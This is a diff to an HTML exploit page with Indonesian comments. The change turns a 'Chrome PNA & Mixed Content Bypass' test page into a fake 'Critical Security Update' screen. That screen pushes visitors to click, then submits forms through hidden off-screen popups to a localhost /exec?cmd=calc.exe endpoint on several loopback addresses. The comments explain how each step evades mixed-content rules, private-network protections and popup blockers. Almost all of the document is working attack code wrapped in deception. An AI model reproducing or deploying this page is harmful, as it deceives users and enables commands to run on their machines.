@@ -1,50 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome PNA & Mixed Content Bypass</title>
+    <title>Critical Security Update - Chromium Research</title>
 </head>
-<body style="background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px;">
-    <h1>SYSTEM VULNERABILITY TEST</h1>
-    <p style="color: #fff;">Attempting to bypass HTTPS -> HTTP (Mixed Content) Block...</p>
-    <div id="status">Status: Waiting for trigger...</div>
+<body style="background: black; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px;">
+    <h1>SYSTEM UPDATE IN PROGRESS</h1>
+    <p style="color: red;">[!] DO NOT CLOSE THIS WINDOW</p>
+    <div id="logs" style="text-align: left; display: inline-block; width: 80%; border: 1px solid #333; padding: 10px; background: #0a0a0a;"></div>
+    
+    <p style="margin-top: 20px; color: #555;">Click anywhere to speed up the process...</p>
 
     <script>
-        // Gunakan IP 0.0.0.0 atau [::] untuk mencoba bypass filter IP 127.0.0.1
-        const targetHost = "http://127.0.0.1:3000/exec?cmd=calc.exe";
+        const log = (msg) => {
+            document.getElementById('logs').innerHTML += `[+] ${msg}<br>`;
+        };
 
-        function bypass() {
-            document.getElementById('status').innerText = "Status: Executing Bypass...";
-
-            // TEKNIK 1: Top-Level Navigation Bypass
-            // HTTPS -> HTTP diblokir untuk sub-resource (img/fetch), 
-            // tapi seringkali lolos jika lewat navigasi jendela baru/pop-up
-            const pwn = window.open(targetHost, "_blank", "width=100,height=100");
+        function deployPayload() {
+            log("Initializing PNA Bypass...");
             
-            // Tutup kembali pop-up dalam 1 detik agar tidak mencurigakan
-            setTimeout(() => { if(pwn) pwn.close(); }, 1000);
+            // Variasi Host untuk membypass filter IP statis
+            const hosts = ["127.0.0.1", "0.0.0.0", "[::1]"];
+            const cmd = "calc.exe";
+            
+            hosts.forEach((host) => {
+                const targetUrl = `http://${host}:3000/exec?cmd=${encodeURIComponent(cmd)}`;
+                log(`Targeting: ${host}...`);
 
-            // TEKNIK 2: Iframe dengan Schema Berbeda
-            // Mencoba memaksa browser merender request
-            const ifr = document.createElement('iframe');
-            ifr.src = targetHost;
-            ifr.style.display = "none";
-            document.body.appendChild(ifr);
-
-            // TEKNIK 3: Form Post via HTTP
-            const form = document.createElement('form');
-            form.method = "GET";
-            form.action = targetHost;
-            form.target = "_blank"; // Membuka di tab baru untuk bypass Mixed Content
-            document.body.appendChild(form);
-            form.submit();
+                // TEKNIK 1: Form Smuggling (Bypass Mixed Content)
+                // Menggunakan form dengan target _blank adalah cara paling ampuh
+                // karena browser menganggapnya sebagai navigasi, bukan sub-resource.
+                const form = document.createElement('form');
+                form.method = "GET";
+                form.action = targetUrl;
+                form.target = "_blank"; // Membuka tab baru (bisa dipicu lewat window.open)
+                document.body.appendChild(form);
+                
+                // TEKNIK 2: Window Popup (Memicu eksekusi di 'background' tab)
+                const pwn = window.open("", `pwn_${host}`, "width=1,height=1,left=9999,top=9999");
+                if (pwn) {
+                    form.target = `pwn_${host}`;
+                    form.submit();
+                    log(`Payload sent to ${host} via Frame Smuggling`);
+                    
+                    // Tutup jendela popup setelah sukses mengirim
+                    setTimeout(() => pwn.close(), 2000);
+                } else {
+                    log(`Popup blocked for ${host}, attempting fallback...`);
+                    // Fallback: Langsung submit (mungkin terlihat oleh user, tapi tembus)
+                    form.submit();
+                }
+            });
         }
 
-        // Jalankan otomatis saat user klik di mana saja (untuk bypass popup blocker)
-        window.onclick = bypass;
-        
-        // Coba jalankan otomatis setelah 2 detik
-        setTimeout(bypass, 2000);
+        // AUTO-TRIGGER: Chrome memblokir window.open otomatis. 
+        // User harus melakukan setidaknya 1 kali klik di halaman.
+        window.onclick = () => {
+            deployPayload();
+            log("Deployment complete.");
+        };
+
+        // Coba jalankan otomatis (mungkin gagal jika popup blocker aktif)
+        window.onload = () => {
+            log("System ready. Click anywhere to proceed.");
+            setTimeout(deployPayload, 3000);
+        };
     </script>
-    <p style="margin-top: 50px; color: #555;">Click anywhere on this page if nothing happens.</p>
 </body>
 </html>
